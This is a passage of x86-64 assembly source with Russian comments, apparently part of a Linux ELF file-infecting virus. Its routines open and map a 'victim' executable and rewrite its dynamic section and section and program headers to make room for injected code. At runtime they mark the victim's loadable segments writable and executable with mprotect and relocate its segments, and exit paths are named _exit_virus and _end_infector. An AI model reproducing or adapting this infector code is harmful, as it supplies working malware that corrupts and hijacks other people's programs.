    loop    _find_dynamic_cycle
    jmp     _find_dynamic_exit

_find_dynamic_success:
    lea     dynamic_records_vaddr(%rip),%rsi
    mov     SHDR_SH_ADDR(%rdi), %rdx
    mov     %rdx, (%rsi)   # dynamic sh_vaddr

    lea     dynamic_records_offset(%rip),%rsi
    mov     SHDR_SH_OFFSET(%rdi), %rdx
    mov     %rdx, (%rsi)   # dynamic sh_offset

    lea     dynamic_records_size(%rip), %rsi
    mov     SHDR_SH_SIZE(%rdi), %rdx
    mov     %rdx, (%rsi)   # dynamic size

_find_dynamic_exit:
    pop     %rdx
    pop     %rcx

    ret

/// _FIND_BIND_NOW_RECORD
/// PARAMS
/// RDI - указатель на секцию dynamic
/// RSI - размер секции
/// Проверяет, есть ли у секции dynamic
/// запись BIND_NOW
/// Если таковой записи нет, то:
/// - высчитываем смещение от начала секции dynamic,
/// по которому будет лежать эта запись (по умолчанию перед
/// записью NULL)
/// - устанавливаем размер будущей новой записи (это нужно, чтоб
/// корректно пересчитывать смещения всех заголовков в будущем)
_find_bind_now_record:
    push    %rax
    push    %rdx
    push    %rcx
    push    %r8

    mov     %rdi, %r8

    // установили счетчик цикла
    mov     %rsi, %rax
    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx

    mov     %eax, %ecx

_find_bind_now_record_cycle:
    // запсиь BIND_NOW?
    cmpq    $0x18, (%rdi)
    je      _find_bind_now_record_success

    // запись NULL?
    cmp     $0x0, (%rdi)
    // запись NULL всегда последняя,
    // так что дальше проверять не имеет смысла
    je      _find_bind_now_record_fail

    add     $0x10, %rdi
    loop    _find_bind_now_record_cycle

    jmp     _find_bind_now_record_fail

_find_bind_now_record_success:
    //  установили флаг, что запись есть
    leaq    bind_now_record_exist(%rip), %rdx
    movb    $0x1, (%rdx)

    jmp     _find_bind_now_record_exit

    // записи BIND_NOW нет - придется позже генерировать новую
_find_bind_now_record_fail:
    leaq    new_bind_now_flag_record_size(%rip), %rdx
    movb    $0x10, (%rdx)

    leaq    new_bind_now_record_exist(%rip), %rdx
    movb    $0x1, (%rdx)

    // посчитали смещение от начала секции dynamic
    // до места, куда будем вписывать новую запись
    leaq    new_bind_now_record_frm_dynamic_offset(%rip), %rdx
    // sub     $0x10, %rdi
    sub     %r8, %rdi
    mov     %rdi, (%rdx)

_find_bind_now_record_exit:
    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rax

    ret

/// _SHDR_OFFSET_AND_ADDR_RECOUNT
/// Пересчитывает адреса и смещения в заголовках, если они не 0
/// Поскольку секция dynamic может расширяться (в заивимости от того,
/// выставлен в ней флаг BIND_NOW компилером или нет),
/// то код, который находится
/// ниже секции dynamic должен сместиться, учитывая это расширение
/// PARAMS
/// RDI - указатель на заголовки,
/// RSI - их количество,
/// RDX - константа, на которую увеличивается значение
/// offset и addr
    .globl  _shdr_offset_and_addr_recount
    .type	_shdr_offset_and_addr_recount, @function

_shdr_offset_and_addr_recount:
    push  %rax
    push  %rbx
    push  %rcx
    push  %r8

    mov   new_bind_now_flag_record_size(%rip), %rbx

    mov   %rsi, %rcx   # установили счетчик цикла
_shdr_offset_and_addr_recount_cycle:
    mov   dynamic_records_vaddr(%rip), %rax

    add   $0x4, %rdi        # проверяем тип
    cmp   $0x4, (%rdi)      # тип rela?
    je    _call_edit_rela_section

    cmp   $0x6, (%rdi)      # тип dynamic?
    jne   _recount_shdr

    // расширить секцию dynamic
    add   $0x1c, %rdi
    add   %rbx, (%rdi)
    sub   $0x1c, %rdi

    jmp   _recount_shdr
    //  секций rela может быть множество,
    // поэтому проще отредактировать ее,
    // как только нашли ее shdr, чем сначала
    // сохранять размеры и смещения всех секций
    // этого типа, а затем дополнительно
    // проходиться циклом и редактировать каждую
_call_edit_rela_section:   # отредаетировать секцию rela

   call  _edit_rela_section

_recount_shdr:
    add   $0xC, %rdi       # смещение до поля sh_addr
    cmp   $0,  (%rdi)      # sh_addr <= 0?

    jle   _recount_shdr_offset

    // секция расположенаа до dynamic?
    cmp   %rax, (%rdi)
    // да
    jle   _add_const_to_addr

    // нет, скорректировать в соответствии
    // с расширением dynamic
    add   %rbx, (%rdi)

_add_const_to_addr:
    add   %rdx, (%rdi)

_recount_shdr_offset:
    mov   dynamic_records_offset(%rip), %rax

    add  $0x8, %rdi
    cmp  $0, (%rdi)

    jle  _next_iter_recount

    // секция расположена до dynamic?
    cmp   %rax, (%rdi)

    jle   _add_const_to_offset

    // нет, скорректировать в соответствии
    // с расширением dynamic
    add   %rbx, (%rdi)

_add_const_to_offset:
    add   %rdx, (%rdi)       # пересчитываем смещение

_next_iter_recount:
    add   $0x28, %rdi       # смещение до след. заголовка
    loop  _shdr_offset_and_addr_recount_cycle

    pop   %r8
    pop   %rcx
    pop   %rbx
    pop   %rax

    ret


/// _PHDR_OFFSET_AND_ADDR_RECOUNT
///    PARAMS
/// RDI -  указатель на заголовки,
/// RSI -  их количество, в
/// RDX -  константа, на которую увеличивается
/// vaddr, paddr и offset всех заголовков, кроме заголовка
/// самой таблицы заголовков сегментов
/// Поскольку секция dynamic может расширяться (в заивимости от того,
/// выставлен в ней флаг BIND_NOW компилером или нет),
/// то код, который находится
/// ниже секции dynamic должен сместиться, учитывая это расширение
_phdr_offset_and_addr_recount:
    push  %rax
    push  %rbx
    push  %rcx
    push  %r8
    push  %r9

    mov   %rsi, %rcx    # установили счетчик цикла
    mov   first_seg_vaddr(%rip), %rsi
    mov   new_bind_now_flag_record_size(%rip), %rbx

_phdr_offset_and_addr_recount_cycle:
    mov   dynamic_records_vaddr(%rip), %r8

    movl  (%rdi), %eax

    // это заголовок самой таблицы заголовков?
    cmp   $0x6,  %rax
    je    _edit_phdr_table_header
    // это заголовок сегмента dynamic?
    cmp   $0x2,  %rax
    jne   _phdr_offset_and_addr_check

    // расширяем dynamic на размер
    // вставляемой записи
    add   $0x20, %rdi
    add   %rbx, (%rdi)

    add   $0x8, %rdi
    add   %rbx, (%rdi)

    sub   $0x28,  %rdi
    jmp   _phdr_offset_and_addr_check

_edit_phdr_table_header:
    // редактируем поля p_filesz
    // и p_memsz в заголовке таблицы сегментов
    // заголовков станет на один больше, значит,
    //  размер таблицы надо увеличить на 56 байт
    add   $0x20, %rdi
    add   %rdx, (%rdi)

    add   $0x8, %rdi
    add   %rdx, (%rdi)

    sub   $0x20, %rdi
    jmp   _next_iter_recount_phdr

_phdr_offset_and_addr_check:
    add   $0x10, %rdi    # проверяем адрес

    cmp   %rsi, (%rdi)
    je    _edit_first_segm_header

    cmp   $0,  (%rdi)
    jle    _recount_offset

    jmp   _recount_vaddr_paddr

_edit_first_segm_header:
    // это первый сегмент кода -
    // содерит в себе заголовки
    // увеличить его p_memsz и p_filesz
    // на размер добавляемого заголвока
    // а вот его vaddr,paddr и offset
    // не редактируем - новый заголвок
    // будет вписан В него, а не ДО
    // него
    add   $0x10, %rdi
    add   %rdx, (%rdi)

    add   $0x8, %rdi
    add   %rdx, (%rdi)

    sub   $0x20, %rdi

    jmp   _next_iter_recount_phdr

_recount_vaddr_paddr:
    cmp   %r8, (%rdi)
    jle   _add_const_to_vaddr_paddr

    add   %rdx, (%rdi)    # recount vaddr and paddr
    add   %rbx, (%rdi)

    add   $0x8, %rdi
    add   %rdx, (%rdi)
    add   %rbx, (%rdi)

    sub   $0x8, %rdi

    jmp   _recount_offset
_add_const_to_vaddr_paddr:
    add   %rdx, (%rdi)    # recount vaddr and paddr

    add   $0x8, %rdi
    add   %rdx, (%rdi)

    sub   $0x8, %rdi

_recount_offset:
    mov   dynamic_records_offset(%rip), %r8

    sub   $0x8, %rdi

    cmp   $0, (%rdi)
    jle   _next_iter_recount_phdr

    // сегмент расположен до dynamic?
    cmp   %r8, (%rdi)

    jle   _add_const_to_phdr_offset

    add   %rbx, (%rdi)
    add   %rdx, (%rdi)

    jmp   _next_iter_recount_phdr

_add_const_to_phdr_offset:
    add   %rdx, (%rdi)

    jmp   _next_iter_recount_phdr

_next_iter_recount_phdr:
    add   $0x30, %rdi

    dec   %rcx
    test  %rcx, %rcx
    jne   _phdr_offset_and_addr_recount_cycle

    pop  %r9
    pop  %r8
    pop  %rcx
    pop  %rbx
    pop  %rax

    ret

/// CNVRT_NUM_TO_HEX_STRING
/// Побайтово конвертирует число в ascii-кода для
/// вывода в шестнадцатеричном формате
/// @PARAMS
/// - %RSI - указатель на массив, в котором лежит число
///
/// Данную функцию можно использовать только после
/// конвертации числа в 16-байтовый массив
/// (см. cnvrt_addr_in_16_byte)
///
/// Если число в текущем байте < 9, оно будет
/// сковертировано в ascii-код цифры, в противном
/// случае число бдет сконвертировано в букву
/// Сконвертированное в аски-коды число записывается
/// в массив converted_addr,
/// в последний байт массива вписывается символ
/// перевода строки для удобства вывода числа в
/// будущем (возможно, перевод строки стоит убрать ?)
converted_addr:
    .space 0x11, 0

    .globl  cnvrt_num_to_hex_string
	.type	cnvrt_num_to_hex_string, @function
cnvrt_num_to_hex_string:
    push    %rax
    push    %rdi
    push    %rcx

    // вписали перевод строки
    lea     converted_addr(%rip), %rdi
    add     $0x10, %rdi
    movb    $0xA,  (%rdi)

    lea     converted_addr(%rip), %rdi
    mov     $0x10, %rcx                  # loop cntr

cnvrt_num_cycle:
    // TAKE CUR. NUM
    xor     %rax, %rax
    movb    (%rsi), %al

    // NUMBER OR LETTER?
    cmp     $0x09, %rax     # число или буква?
    jg      cnvrt_in_letter

    // NUMER
    add     $0x30,  %al # сконвертировать аски-код числа
    jmp     continue_cycle

    // LETTER
cnvrt_in_letter:
    add     $0x57, %al  # сконвертировать аски-код числа

    // WRITE DOWN ASCII-CODE
continue_cycle:
    movb    %al, (%rdi)

    inc     %rsi
    inc     %rdi
    loop    cnvrt_num_cycle

cnvrt_num_end:
    popq    %rcx
    popq    %rdi
    popq    %rax

	ret

// test_cnvrt_num_to_hex_string:

//     pushq   %rbp
// 	movq    %rsp, %rbp

//     mov     $byted_addr, %rdi
//     mov     $0x10, %rsi

//     call    clear_array
//     mov     $byted_addr, %rsi

//     movb    $0x01, (%rsi)

//     call    cnvrt_num_to_hex_string

//     mov     $0x0, %rdi
//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx
//     call    write

//     popq    %rbp
// 	ret


/// принимает в rdi адрес массив,
/// в rsi - его размер, заполняет массив нулями
/// NB!: А чего сразу в %RCX не принимать?
/// NB!: Зачем здесь пролог и эпилог?
/// NB!: Это делается через repnz stosb,
///      разберись как работают эти команды
clear_array:
    // pushq   %rbp
	// movq    %rsp, %rbp
    push    %rcx
    mov     %rsi, %rcx

clear_array_cycle:
    movb    $0x0, (%rdi)
    inc     %rdi
    loop    clear_array_cycle

clear_array_end:
    pop     %rcx
    // popq    %rbp
	ret

/// CNVRT_ADDR_IN_16_BYTE
/// Конвертирует восьмибайтовое число в такое же
/// 16-байтовое, т.е. каждые полбайта
/// занимают байт на выходе. Конвертация начинается
/// с младших разрядов числа.
/// Сконвертированное число записывается в массив
/// byted_addr
///  Конвертация происходит за 16 итераций цикла,
/// на каждой итерации:
/// - на конвертируемое число накладывается маска
/// - полученное число сдвигается вправо на 4 бита
/// столько раз,
///   сколько было итераций цикла, чтоб результат
/// оказался в младших разрядах
/// - результат записывается в следующий доступный
/// байт массива byted_addr
/// - маска сдвигается на 4 бита влево
/// @PARAMS
/// - %RDI - число для конвертирования
/// NB!: Просто посмотри на это:
/// (для sizeof(.) = 16 битов):
/// src:   position: FEDCBA9876543210
///            data: 1011101010111100
///                   /  \   /   \
/// copy 4 times:    /    \ /     \
/// 0011101010111100 1011101010111100 1011101010111100 1011101010111100
/// (.=& 0xF000)     (.=& 0x0F00)     (.=& 0x00F0)     (.=& 0x000F)
/// 0011000000000000 0000101000000000 0000000010110000 0000000000001100
/// (.>> 12)         (.>> 8)          (.>> 4)          (.>> 0)
/// 0000000000000011 0000000000001010 0000000000001011 0000000000001100
/// .+= 0x30 ; if (.>0x39) { .+= 0x57-0x30 }
/// "3"              "A"              "B"              "C"
/// Неужели сложно такое экстраполировать для quad?
/// Нужна всего одна функция, а если надо будет вывести не quad а байт,
/// то никто не мешает обнулить старшие биты... Неужели это так сложно?
/// NB!: globl, @function ?
cnvrt_addr_in_16_byte:
    push    %r8
    push    %r9
    push    %rcx
    push    %rdx
    push    %rbx
    push    %rsi

    // SETUP VALUES
    mov     %rdi, %rdx
    lea     byted_addr(%rip), %rsi

    add     $0xF, %rsi      # начинается с младших
    mov     $0x10, %rcx     # loop cntr

    mov     $0xF, %rbx      # маска для числа

   // CONVERT NUMBER
cnvrt_addr_loop:
    and     %rbx, %rdx      # наложить маску на число

    mov     $0x10, %r8      # calc пройденных итераций
    mov     %rcx, %r9
    sub     %r9, %r8

    // ROTATE NUM RIGHT
rotate_num_right:
    cmp     $0, %r8
    jle     continue_cnvrt_addr_loop

    shr     $0x4, %rdx
    dec     %r8
    jmp     rotate_num_right

continue_cnvrt_addr_loop:
    movb    %dl, (%rsi) # записать число по адресу
    mov     %rdi, %rdx  # восстановить исходное число
    shl     $0x4, %rbx  # маску на 4 бита влево
    dec     %rsi        # укатель на следующий байт

    loop   cnvrt_addr_loop

    pop     %rsi
    pop     %rbx
    pop     %rdx
    pop     %rcx
    pop     %r9
    pop     %r8

    ret


/// NB!: Писать на ассемблере тесты к ассемблеру (да еще и в одном и том же файле) - удовольствие явно уровнем ниже чем писать тесты на лиспе. Я бы на твоем месте писал тесты к функциям как скрипты к GDB - это куда проще. Найди, как GDB умеет проверять значения в при попадании в бряк, делать IF и выдавать логи - и тебе останется только открыть файл лога чтобы посмотреть все ли тесты прошли.

/// TEST_CNVRT_ADDR_IN_16_BYTE
/// тестирует конвертацию числа
/// если не подключать конвертациж полученного числа и не выводить его на экран,
/// то посмотреть результат можно только в гдб
/// TODO решить эту проблему */
//test_cnvrt_addr_in_16_byte:
//     mov     $0xFFFFFFFF, %rdi
//     call    cnvrt_addr_in_16_byte
//     ret
//     цель теста:
//     - сконвертировать восьмибайтовое число в 16-байтовый массив
//     - сконвертировать каждый байт этого массива в ascii-код
//     - вывести полученное число в stdout */
// test_cnvrt_addr_in_16_byte:
//     pushq   %rbp
// 	movq    %rsp, %rbp

//     // mov     $0x40, %rdi        # тесты с разными числами
//     // mov     $0xFFFFFFFFFFFFFFFF, %rdi
//     // mov     $0x8FFFE, %rdi
//     mov     $0xDEADBEEFBAADF00D, %rdi
//     // mov     $-31, %rdi   # (?)

//     call    cnvrt_addr_in_16_byte

//     mov     $byted_addr, %rsi
//     call    cnvrt_num_to_hex_string

//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx

//     call    _my_write

//     popq    %rbp
// 	ret

/// MY_MMAP file into memory
/// Считывает файл в память по заданному адресу.
/// Флаги должны быть такими же, какие передавали
/// open для открытия файла.
/// @PARAMS
///  - %RDI - адрес для записи (по умолчанию NULL,
///           в этом случае назначается OS)
///  - %RSI - длина считываемого файла
///  - %RDX - права доступа к памяти
///           (RDONLY, RDWR и т.д.)
///  - %RCX -  права для доступа к памяти для
///            процессов (MMAP_SHARED, MMAP_PRIVATE)
///  * %R8 -   fd считываемого файла
///  * %R9 -   offset от начала считываемого файла
_my_mmap:
    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

	ret


// MY_STAT
// @PARAMS
// %RDI - file name
// %RSI - stat struct pointer
_my_stat:
    // stat изменяет этот регистр
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~
    // NB: Any syscall destroys %rcx and %r11
    // Почему это происходит?
    // Инструкция входа в режим ядра syscall
    // сохраняет в регистре RCX значение RIP,
    // а в R11 – значение регистра флагов и
    // переходит к выполнению функции ядра
    // (адрес которой хранится в специальном
    // Model Specific -регистре).
    // Инструкция sysret же выполняет всё наоборот:
    // восстанавливает RIP из регистра RCX и регистр
    // флагов (почти весь) из регистра R11.
    // Поскольку в x64 кол-во регистров довольно
    // много, а RCX и R11 не участвуют в передаче
    // параметров, создатели системы решили не
    // заморачиваться с сохранением этих регистров
    // (возможно, заодно и для ускорения системного
    // вызова и возврата)
    push    %rcx
    mov     $0x04, %rax

    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop    %rcx
  	ret

    ERR_MSG _my_stat "my_stat"


/// OPENFILE
/// Открывает файл с указанными флагами,
/// маппит его в память
///
/// @PARAMS:
/// - %RDI - file name
/// - %RSI - flags
///
/// @RET:
/// - %RAX - указатель на файл в памяти
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    // jl      _openfile_neg_fd_error

    jl      _openfile_exit

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    leaq    fd(%rip), %rcx   # сохранить дескриптор жертвы
    mov     %rax, (%rcx)     # понадобится для перезаписи

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    // leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    leaq    -0xD0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    // mov     -0x70(%rbp), %rsi   # filesz
    mov     -0xA0(%rbp), %rsi   # filesz
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    mov     $O_RDONLY, %rbx
    cmp     %rbx, %rax
    je      mmap_rdonly

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

mmap_rdwr:
    mov     $(PROT_READ | PROT_WRITE), %rdx # prot
    jmp     call_my_mmap

mmap_rdonly:
    mov     $PROT_READ, %rdx            # prot
    // call mmap
call_my_mmap:
    call    _my_mmap
    // test    %rax, %rax
    // // jle     _openfile_ptr_error
    // jle     _openfile_exit

// 2: /x $rdi = 0x403a02
// 3: /x $rsi = 0x2
// 4: /x $rax = 0x0
// 5: /x $rbx = 0x7
// 6: /x $rcx = 0x404d0f
// 7: /x $rdx = 0x40
// 8: /x $r8 = 0x76eb
// 9: /x $r10 = 0x76ab

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
	ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"

    // -------------------------------------------

// WRITE TO STDOUT
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_my_write:
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall
    ret

/// * @PARAMS
/// *   - %RDI - ptr dest
/// *   - %RSI - ptr src
/// *   - %RDX - bytesz
/// *   - RCX - адрес dynamic для сравнения
_my_memcpy:
    pushq    %rcx
    pushq    %rax
    pushq    %rbx

    // loop cnt
    mov      %rcx, %rax
    movq     %rdx, %rcx

_cycle_my_memcpy_before_dynamic:

    // этот цикл работает, пока мы
    // перемещаем все до секции dynamic
    movb    (%rsi), %dl
    cmp     %rax, %rsi
    // как только мы на нее наткнулись
    // пропускаем ее
    je      _scip_dynamic
    // если мы уже находимя после нее,
    // то переходим в цикл
    // _cycle_my_memcpy_after_dynamic
    jg      _move_dest

    movb    %dl, (%rdi)

    inc     %rsi
    inc     %rdi

    loop     _cycle_my_memcpy_before_dynamic
    jmp      _my_memcpy_exit

    // пропускаем секцию dynamic -
    // не редактируем ее
_scip_dynamic:
    mov     dynamic_records_size(%rip), %rbx

    // сдвинуть указатели на конец
    // секции dynamic
    add     %rbx, %rdi
    add     %rbx, %rsi

    jmp    _cycle_my_memcpy_before_dynamic

_move_dest:
    mov     new_bind_now_flag_record_size(%rip), %rbx
    sub     %rbx, %rdi

    //  этот цикл начнется на той же итерации,
    //  на которой был _cycle_my_memcpy_before_dynamic
_cycle_my_memcpy_after_dynamic:
    movb    (%rsi), %dl
    movb    %dl, (%rdi)

    inc     %rsi
    inc     %rdi

    dec     %rcx
    test    %rcx, %rcx
    je      _my_memcpy_exit
    jmp     _cycle_my_memcpy_after_dynamic

_my_memcpy_exit:
    popq     %rbx
    popq     %rax
    popq     %rcx

    ret

/// _MY_STRLEN
/// PARAMS -
/// RDI - указатель на строку
_my_strlen:
    xor     %rax, %rax
    push    %rcx
    push    %rbx

    mov     $0x64, %rcx
    repne   scasb

    mov     $0x64, %rbx
    sub     %rcx, %rbx
    mov     %rbx, %rax
    dec     %rax

    pop     %rbx
    pop     %rcx

    ret
/// _MPROTECT_IN_LOOP
/// RDI - указатель на таблицу заголовков
/// RSI - их количество
/// RDX - виртуальный адрес начала эльфа
/// RCX - адрес начала эльфа в памяти
/// Разрешает самомодификацию жертве
/// Проходится по заголовкам сегментов,
/// находит сгменты типа LOAD, читает
/// их виртуальные адреса, пересчитывает в физические
/// вызывает mprotect для каждого сегмента LOAD
_mprotect_in_loop:
    push    %rax
    push    %rbx
    push    %rdx
    push    %r8

    mov     %rcx, %r8
    mov     %rsi, %rcx

_mprotect_cycle:
    // загружаемвый сегмент?
    cmp     $0x1, (%rdi)
    jne     _mprotect_cycle_next

    push    %rcx
    push    %rdi
    push    %rdx

    mov     PHDR_P_VADDR(%rdi), %rax
    mov     PHDR_P_MEMSZ(%rdi), %rbx
    sub     %rdx, %rax
    add     %r8, %rax # адрес начала сегмента

    mov     PHDR_P_VADDR(%rdi), %rsi
    add     %rsi, %rbx
    sub     %rdx, %rbx
    add     %r8, %rbx # адрес конца сегмента

    and     $~0xFFF, %rax  # выровненный адрес
    mov     %rax, %rdi

    sub     %rdi, %rbx  # размер памяти
    mov     %rbx, %rsi

    mov     $0x7, %rdx   # RW+EXEC flags - $RDX
    mov     $0xA, %rax   # mprotect handle
    syscall

    pop     %rdx
    pop     %rdi
    pop     %rcx

    test    %rax, %rax
    jne     _mprotect_cycle_fail

_mprotect_cycle_next:
    add     $0x38, %rdi
    loop    _mprotect_cycle

_mprotect_cycle_success:
    pop     %r8
    pop     %rdx
    pop     %rbx
    pop     %rax

    ret
_mprotect_cycle_fail:
    pop     %r8
    pop     %rdx
    pop     %rbx
    pop     %rax

    jne     _exit_virus

/// _COUNT_SEG_ADDR_IN_MEMORY
/// Считает адрес сегмента в памяти
/// PARAMS:
/// RDI - заголовок сегмента
/// RSI - адрес начала эльфа в памяти(!)
/// RDX - виртуальный адрес начала эльфа
/// Возвращаемое значение - RAX
// _count_seg_addr_in_memory:
//     push    %rcx

//     mov     PHDR_P_VADDR(%rdi), %rcx
//     sub     %rdx, %rcx # смещение сегмента в памяти от
//                        # начала эльфа

//     mov     %rsi, %rax
//     add     %rcx, %rax

//     pop     %rcx
//     ret

/// _COUNT_BEGIN_ELF_ADDR_IN_MEMORY
/// Считает адрес, по которому лежит
/// инфицированный исполняющийся эльф
/// RDI - смещение от vaddr original e_entry до начала эльфа
/// RSI - смещение от original e_entry до текущего e_entry
_count_begin_elf_addr_in_memory:

    push    %rax
    push    %rbx

    // грузим адрес _start - это будет
    // актульаный e_entry
    leaq    _start(%rip), %rax

    sub     %rsi, %rax
    sub     %rdi, %rax

    leaq    victim_elf_addr(%rip), %rdi
    mov     %rax, (%rdi)
    pop     %rbx
    pop     %rax
    ret

/// _MOVE_SEGMENTS
/// RDI - указатель на таблицу заголовков
/// RSI - их количество
/// RDX - виртуальный адрес начала эльфа
/// RCX - адрес начала эльфа в памяти
/// R8 - адрес секции dynamic в памяти
_move_segments:
    push    %rax
    push    %rbx
    push    %r9
    push    %r10

    mov     %rcx, %r10
    mov     %rsi, %rcx
_move_segments_cycle:
    // загружаемвый сегмент?
    cmp     $0x1, (%rdi)
    jne     _move_segments_next

    // это первый загружаемый сегмент кода?
    mov     PHDR_P_OFFSET(%rdi), %rax
    test    %rax, %rax
    je      _move_first_segment
    jmp     _move_segment

_move_segment:
    push    %rdx

    mov     PHDR_P_VADDR(%rdi), %rax
    sub     %rdx, %rax
    add     %r10, %rax # адрес начала сегмента

    push    %rcx
    // откуда пишем
    mov     %rax, %rsi
    mov     PHDR_P_MEMSZ(%rdi), %rdx # размер сегмента

    mov     %rdi, %rbx

    // куда пишем
    mov     %rax, %rdi
    sub     $0x38, %rdi

    // адрес dynamic для сравнения
    mov     %r8, %rcx
    call    _my_memcpy

    pop     %rcx
    pop     %rdx
    mov     %rbx, %rdi

_move_segments_next:
    add     $0x38, %rdi
    loop    _move_segments_cycle
    jmp     _move_segments_exit

    // сдвигаем первый сегмент кода
    // он включает в себя заголовок эльфа и
    // таблицу заголовков сегментов, которые
    // сдвигать не надо - нам надо сдвинуть только
    // код жертвы, который начинается сразу после
    // таблицы заголовков
_move_first_segment:
    push    %rdx
    mov     %rdi, %rbx

    mov     PHDR_P_VADDR(%rdi), %rax
    sub     %rdx, %rax
    add     %r10, %rax # адрес начала сегмента

    mov     %rax, %rsi

    mov     PHDR_P_MEMSZ(%rdi), %rdx

    lea     _exit_victim(%rip), %rax
    mov     transfer_control_code_size(%rip), %r9
    add     %r9, %rax

    push    %r10
    push    %rcx

    mov     OFFSET_TO_VICT_CODE_FRM_FILE_BEGIN(%rax), %r10
    sub     %r10, %rdx  # размер сдвигаемого сегмента

    add     %r10, %rsi
    mov     %rsi, %rdi
    sub     $0x38, %rdi

    // адрес dynamic для сравнения
    mov     %r8, %rcx

    call    _my_memcpy

    pop     %rcx
    pop     %r10
    pop     %rdx
    mov     %rbx, %rdi
    jmp     _move_segments_next

_move_segments_exit:
    pop     %r10
    pop     %r9
    pop     %rbx
    pop     %rax

    ret


/// _MOVE_VICTI
/// Сдвигает жертву на ее прежние адреса
_move_victim:
    push    %rax
    push    %rdx
    push    %rdi
    push    %rsi
    push    %r8

    mov     transfer_control_code_size(%rip), %r8
    leaq    _exit_victim(%rip), %rdi
    add     %r8, %rdi

    mov     NEW_BIND_NOW_FLAG_RECORD_SIZE(%rdi), %rax
    lea     new_bind_now_flag_record_size(%rip), %rcx
    mov     %rax, (%rcx)

    // разрешаем редактировать код жертвы
_mprotect_for_victim:
    // высчитали адрес, по которому лежит эльф
    // в памяти
    mov     FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY_OFFSET(%rdi), %rsi
    mov     VICTIM_CODE_BEGIN_VADDR_OFFSET(%rdi), %rdi

    call    _count_begin_elf_addr_in_memory

    // высчитали адрес таблицы заголовков
    // и их количество
    leaq    victim_phdr_table_addr(%rip), %rdi
    mov     victim_elf_addr(%rip), %rsi

    mov     ELF_E_PHOFF(%rsi), %rax

    add     %rsi, %rax
    mov     %rax, (%rdi)

    mov     ELF_E_PHNUM(%rsi), %rax
    leaq    victim_phdr_amount(%rip), %rbx
    movb    %al, (%rbx)

    // здесь будет разрешение жертвы на самомодификацию
    lea     _exit_victim(%rip), %rdi
    mov     transfer_control_code_size(%rip), %r8
    add     %r8, %rdi
    mov     FIRST_SEGM_VADDR_OFFSET(%rdi), %rdx
    mov     victim_phdr_table_addr(%rip), %rdi
    mov     victim_phdr_amount(%rip), %rsi
    mov     victim_elf_addr(%rip), %rcx

    call    _mprotect_in_loop

_undo_editing_dynamic_records:
// редактируем dynamic
    leaq    _exit_victim(%rip), %rax
    mov     transfer_control_code_size(%rip), %r8
    add     %r8, %rax  # пропустили блок передачи
                        # управления

    // высчитали адрес dynamic в памяти
    mov     FIRST_SEGM_VADDR_OFFSET(%rax), %rsi
    mov     (%rax), %rdi

    // секция динамик вообще есть?
    test    %rdi, %rdi
    je      _move

    // да, высчитать ее адрес в памяти
    sub     %rsi, %rdi

    mov     victim_elf_addr(%rip), %rcx
    add     %rcx, %rdi

    leaq    dynamic_records_vaddr(%rip), %rbx
    mov     %rdi, (%rbx)

    mov     $-0x38, %rsi # const

    mov     DYNAMIC_REC_SZ_OFFSET(%rax), %rdx

    leaq    dynamic_records_size(%rip), %rbx
    mov     %rdx, (%rbx)

    mov     FIRST_SEGM_VADDR_OFFSET(%rax), %rcx
    mov     victim_phdr_amount(%rip), %rax
    sub     $0x1, %rax
    mov     $0x38, %rbx
    imul    %rax, %rbx
    add     %rbx, %rcx

    call    _recount_dynamic_section

_move:
    // сдвигаем жертву
    leaq    _exit_victim(%rip), %rax
    mov     transfer_control_code_size(%rip), %r8
    add     %r8, %rax

    // mov     DYNAMIC_REC_SZ_OFFSET(%rax), %rdx
    mov     dynamic_records_vaddr(%rip), %r8
    // add     %rdx, %r8

    mov     FIRST_SEGM_VADDR_OFFSET(%rax), %rdx
    mov     victim_phdr_table_addr(%rip), %rdi
    mov     victim_phdr_amount(%rip), %rsi
    mov     victim_elf_addr(%rip), %rcx

    call    _move_segments

    pop     %r8
	pop     %rsi
	pop     %rdi
	pop     %rdx
    pop     %rax

    ret

_exit_virus:
    mov     old_rsp(%rip), %rsp     # restore old %RSP

    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

// ERROR HANDLING
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp _end_infector

_end_infector:
    mov     old_rsp(%rip), %rsp     # restore old %RSP
    mov     old_rax(%rip), %rax
    mov     old_rbx(%rip), %rbx
    mov     old_rdx(%rip), %rdx
    mov     old_rcx(%rip), %rcx
    mov     old_rdi(%rip), %rdi
